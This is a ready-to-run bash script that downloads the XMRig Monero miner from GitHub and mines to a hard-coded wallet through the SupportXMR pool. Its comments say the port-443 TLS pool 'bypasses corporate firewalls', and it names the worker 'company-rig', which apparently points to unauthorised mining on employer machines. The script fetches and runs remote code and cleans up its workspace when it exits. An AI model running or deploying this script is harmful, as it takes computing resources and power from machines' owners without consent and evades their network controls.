#!/bin/bash

# ==========================================
# Configuration
# ==========================================
# Monero (XMR) payout address
WALLET_ADDRESS="42DFRYvNTcoghf5QjuQPGYVc8kQPXCneCT5wySU37PSL8zTdwu7w9BxBHkmYB7v97bdTgmhG9jM1caSkxctSfwuEBEoQVWm"

# SupportXMR encrypted TLS pool on HTTPS port 443 (Bypasses corporate firewalls)
POOL_URL="pool.supportxmr.com:443"

# Worker name for tracking statistics on supportxmr.com
WORKER_NAME="company-rig"
# ==========================================

XMRIG_VERSION="6.22.0"
XMRIG_TAR="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${XMRIG_TAR}"

# Remember original directory and script folder
ORIG_DIR="$(pwd)"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-.}")" 2>/dev/null && pwd || pwd)"

# Validate wallet address format
if [ -z "$WALLET_ADDRESS" ] || [[ "$WALLET_ADDRESS" == *"your"* ]]; then
    echo "[-] Error: Please configure your Monero wallet address at the top of the script."
    exit 1
fi

# Create a secure temporary workspace in the current directory
TEMP_DIR=$(mktemp -d -p "$SCRIPT_DIR" supportxmr_miner_XXXXXX)
if [ ! -d "$TEMP_DIR" ]; then
    echo "[-] Error: Failed to create temporary directory in $SCRIPT_DIR"
    exit 1
fi

# Clean up trap handler
CLEANUP_DONE=false
cleanup() {
    if [ "$CLEANUP_DONE" = true ]; then
        return
    fi
    CLEANUP_DONE=true
    trap - EXIT INT TERM HUP

    echo -e "\n[+] Cleaning up..."
    cd "$ORIG_DIR" 2>/dev/null || cd /tmp

    if [ -n "$TEMP_DIR" ] && [ -d "$TEMP_DIR" ]; then
        rm -rf "$TEMP_DIR"
    fi

    echo "[+] Done. Miner completely removed."
}

# Catch all termination signals
trap cleanup EXIT INT TERM HUP

echo "[+] Created temporary workspace: $TEMP_DIR"
cd "$TEMP_DIR" || exit 1

# Download helper function
download_file() {
    local url="$1"
    local output="$2"
    if command -v curl &>/dev/null; then
        curl -fSL -s -o "$output" "$url"
    elif command -v wget &>/dev/null; then
        wget -q -O "$output" "$url"
    else
        echo "[-] Error: Neither curl nor wget is installed."
        return 1
    fi
}

echo "[+] Downloading XMRig v${XMRIG_VERSION}..."
if ! download_file "$XMRIG_URL" "xmrig.tar.gz"; then
    echo "[-] Error: Failed to download XMRig from $XMRIG_URL"
    exit 1
fi
tar -xzf xmrig.tar.gz

XMRIG_BIN=$(find . -maxdepth 2 -type f -name "xmrig" | head -n 1)
if [ ! -x "$XMRIG_BIN" ]; then
    echo "[-] Error: Could not find or execute XMRig binary."
    exit 1
fi

echo "[+] Connecting to $POOL_URL via encrypted TLS (Port 443)..."
echo "[+] Mining to address: $WALLET_ADDRESS"
echo "[+] Worker name: $WORKER_NAME"
echo "[+] Press 'h' for hashrate, 's' for shares, 'c' for connection, Ctrl+C to exit."
echo "-------------------------------------------------------------------------------"

# Run XMRig connected to SupportXMR over TLS port 443
if [ -e /dev/tty ] && [ ! -t 0 ]; then
    "$XMRIG_BIN" -o "$POOL_URL" --tls -u "$WALLET_ADDRESS" -p "$WORKER_NAME" --print-time=30 < /dev/tty
else
    "$XMRIG_BIN" -o "$POOL_URL" --tls -u "$WALLET_ADDRESS" -p "$WORKER_NAME" --print-time=30
fi
